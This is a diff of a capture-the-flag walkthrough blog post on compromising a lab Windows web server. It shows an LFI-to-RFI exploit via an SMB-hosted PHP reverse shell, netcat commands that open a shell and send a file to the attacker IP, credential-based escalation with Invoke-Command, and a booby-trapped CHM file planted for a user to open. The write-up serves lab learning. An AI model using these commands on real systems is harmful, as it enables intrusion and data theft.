@@ -52,9 +52,9 @@ While that run's we will quckly point ```SQLMap``` and the ```/blog/?lang=blog-e
 
 We get our proxy turned on and start looking at the requests. The first request that we want to look at is obviously ```/blog/?lang=``` since this has potential for exploit. We play with the request a few times and finally find a ```LFI```.
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/image-5.png" caption="We request the system.ini file" >}}
+![](/images/2019/12/image-5.png" caption="We request the system.ini file)
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/image-6.png" caption="And here it is." >}}
+![](/images/2019/12/image-6.png" caption="And here it is.)
 
 So it looks like we have an LFI we can exploit. Now we need convert this LFI into somehow. Thankfully Windows will let us execute scripts on ```SMB``` shares. Explicitly this [RFI PHP Bypass](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html). So we'll need to create a reverse shell script and remote execution script, spin up an SMB share and then call the script via our LFI. 
 
@@ -77,17 +77,17 @@ Now we need to have a way for our shell to executed. There are a few ways to do 
 
 Now that we have our pieces in place, let's execute! We head over to our browser and go to ```http://10.10.10.151/blog/?lang=//10.10.15.177/ica/wolfshell.php```. This will make the server load the file from our ```SMB``` share and give us a shell back to itself.
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/image-7.png" >}}
+![](/images/2019/12/image-7.png)
 
 We have a shell as ```iusr```. We need to convert this into a more permanent shell. We will upload our previously created payload to the system and execute it. 
 
 During the upload we seem to keep getting some errors. Possibly due to Windows Defender eating our payload(s). So we'll get a bit more lowtech and basic. We can upload a ```netcat``` binary and just use that to forward a shell to us.
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/full_nc.gif" >}}
+![](/images/2019/12/full_nc.gif)
 
 Now that we have a more stable shell type, lets enumerate. In the ```inetpub``` structure we see some interesting files:
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/image-8.png" >}}
+![](/images/2019/12/image-8.png)
 
 Inside the ```db.php``` file we some credentials.
 
@@ -108,11 +108,11 @@ Invoke-Command -Session $session -ScriptBlock { C:\tmp\nc.exe -e cmd.exe 10.10.1
 
 Here's a quick breakdown of the above. The ```$username``` variable stores our username. The ```$pass``` stores our password. We then convert the ```$pass``` variable into a secured variable that we can pass to other functions. With ```$credential``` we store the ```$username``` and secured ```$pass```. We then create a new session with ```New-PSSession```. This created a new "sub session" within the machine. Then we finally tell that session to forward a escalated shell via ```nc.exe```.
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/escalate.gif" >}}
+![](/images/2019/12/escalate.gif)
 
 Now that we have a shell as Chris, let's enumerate again! There is a file called ```Instructions.chm``` in the ```Downloads``` folder. We also see there is a folder called ```Docs``` on the root of C. Inside we have a few files.
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/image-9.png" >}}
+![](/images/2019/12/image-9.png)
 
 We will send the .chm over to our machine with nc: 
 ```C:\temp\nc64.exe -w 3 10.10.15.177 777 < instructions.chm```
@@ -122,7 +122,7 @@ Catch it with the corresponding listener:
 
 This is what we see when we open the file:
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/image-10.png" >}}
+![](/images/2019/12/image-10.png)
 
 Nothing of great use. However based on what we saw, we know that the CEO is expecting some documentation to land in the Docs directory. Maybe we can craft a payload and when the CEO opens it, compromises him. Luckily for us, we have the means [to do just that](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1).
 
@@ -136,7 +136,7 @@ This creates the payload. We then need to get our payload to ```C:\Docs```. Spin
 
 Once we download it, we move it to ```C:\Docs``` and wait for a shell.
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/lsat_step.gif" >}}
+![](/images/2019/12/lsat_step.gif)
 
 We have a shell as root!
 
